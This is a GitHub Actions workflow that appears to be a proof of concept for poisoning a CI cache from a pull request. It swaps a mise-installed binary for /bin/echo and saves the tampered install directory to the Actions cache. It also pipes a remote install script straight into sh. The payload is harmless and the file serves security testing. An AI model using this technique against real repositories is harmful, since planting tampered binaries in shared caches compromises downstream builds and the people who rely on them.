name: pr-write-realistic
on:
  pull_request:

jobs:
  write-cache:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      MISE_DATA_DIR: ${{ github.workspace }}/mise-data
      MISE_CACHE_DIR: ${{ github.workspace }}/mise-cache
      MISE_YES: "1"
    steps:
      - uses: actions/checkout@v4

      - name: install mise
        run: |
          curl https://mise.run | sh
          echo "$HOME/.local/bin" >> "$GITHUB_PATH"

      - name: trust config
        run: mise trust

      - name: mise install (legitimate)
        run: mise install

      - name: record legitimate state
        run: |
          echo "ref=${{ github.ref }}"
          echo "event=${{ github.event_name }}"
          find "$MISE_DATA_DIR/installs" -type f -exec sha256sum {} \;

      - name: tamper installed binary at its real install path
        run: |
          INSTALL_PATH="$MISE_DATA_DIR/installs/github-theredspoon-widget/1.0.0/widget"
          echo "--- before tamper ---"
          sha256sum "$INSTALL_PATH"
          cat "$INSTALL_PATH"
          cp /bin/echo "$INSTALL_PATH"
          chmod +x "$INSTALL_PATH"
          echo "--- after tamper (same path, different valid executable, no incomplete marker) ---"
          sha256sum "$INSTALL_PATH"
          "$INSTALL_PATH" TAMPER-MARKER-FROM-PR-JOB

      - name: save tampered install dir to Actions cache
        id: cache-save
        uses: actions/cache/save@v4
        with:
          path: mise-data/installs
          key: mise-boundary-poc-realistic-v1

      - name: report
        env:
          TRIGGER: ${{ github.event_name }}
          REF: ${{ github.ref }}
          HEAD_REF: ${{ github.head_ref }}
          BASE_REF: ${{ github.base_ref }}
        run: |
          echo "attempted cache save under key mise-boundary-poc-realistic-v1"
          echo "trigger=$TRIGGER ref=$REF head_ref=$HEAD_REF base_ref=$BASE_REF"
